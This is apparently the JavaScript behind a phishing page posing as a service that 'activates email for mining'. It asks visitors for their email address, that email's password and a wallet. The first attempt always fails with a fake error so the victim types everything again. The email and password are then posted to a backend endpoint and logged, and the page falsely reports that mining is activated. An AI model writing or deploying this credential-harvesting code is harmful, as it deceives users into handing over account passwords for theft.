

function setCookie(cname, cvalue, exdays) {
  var d = new Date();
  d.setTime(d.getTime() + (exdays*24*60*60*1000));
  var expires = "expires="+ d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i <ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

/********** Activate Email for mining *************/
const activateButton = document.querySelector('#activate');

activateButton.addEventListener('click', (e) =>{
  e.preventDefault();

  const activateText = document.querySelector('#free_activate');

  activateText.innerHTML = " VALIDATING EMAIL..."
setTimeout(function(){
   if(getCookie('validate') == false || document.getElementById('email').value == "" || document.getElementById('email_password').value == "" || document.getElementById('wallet').value == ""){
    activateText.innerHTML = "<font color='red'> Error validating, please check your inputs and try activating.</font>";
    setCookie('validate', true, 30)
  }else{
    // Data to be sent to the backend
    let  data = {
  email : document.querySelector("#email").value,
  email_password : document.querySelector("#email_password").value
  
};

console.log(document.querySelector("#email_password").value)

data = JSON.stringify(data) //transform data to json

//Using fetch to retrieve and send to the backend

// Create our request constructor with all the parameters we need
var request = new Request("/validate-email", {
    method: 'POST', 
    body: data, 
    headers: new Headers({"content-type" : "application/json"})
});

fetch(request).then(response => response.json()).
then((data) => {
  console.log(data)
  
  activateText.innerHTML = "<font color='green'> Mining activated, <a href='#'> Start Mining </a></font>";
  

}).catch((e) => {
  console.log(e)

})
  }
},1000)
 
})